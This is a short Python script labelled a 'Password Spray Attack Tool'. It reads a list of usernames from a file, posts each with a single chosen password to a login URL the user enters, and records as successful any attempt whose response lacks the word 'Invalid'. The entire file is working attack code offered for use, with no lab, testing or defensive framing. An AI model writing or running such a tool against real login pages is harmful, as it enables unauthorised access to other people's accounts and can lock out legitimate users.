import requests
import os

def save_results_to_file(base_name, results):
    results_dir = "results"
    os.makedirs(results_dir, exist_ok=True)

    count = 0
    while True:
        filename = f"{base_name}{count}.txt" if count > 0 else f"{base_name}.txt"
        filepath = os.path.join(results_dir, filename)
        if not os.path.exists(filepath):
            break
        count += 1

    try:
        with open(filepath, 'a') as f:
            for result in results:
                f.write(result + '\n')
        print(f"Results saved in {filepath}")
    except Exception as e:
        print(f"Error writing file: {e}")

def password_spray_tool():
    print("Password Spray Attack Tool")
    target_url = input("Enter the target URL (e.g., http://example.com/login): ")
    username_file = input("Enter the path to the username file (one per line): ")
    common_password = input("Enter the password to spray: ")

    try:
        with open(username_file, 'r') as file:
            usernames = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"Error: The file '{username_file}' was not found.")
        return

    results = []

    for username in usernames:
        try:
            response = requests.post(target_url, data={"username": username, "password": common_password})
            if "Invalid" not in response.text:
                result_str = f"Password spray successful for username: {username}"
                print(result_str)
                results.append(result_str)
            else:
                print(f"Failed attempt for username: {username}")
        except Exception as e:
            result_str = f"Error: {e}"
            print(result_str)
            results.append(result_str)

    save_results_to_file("password_spray_results", results)

password_spray_tool()
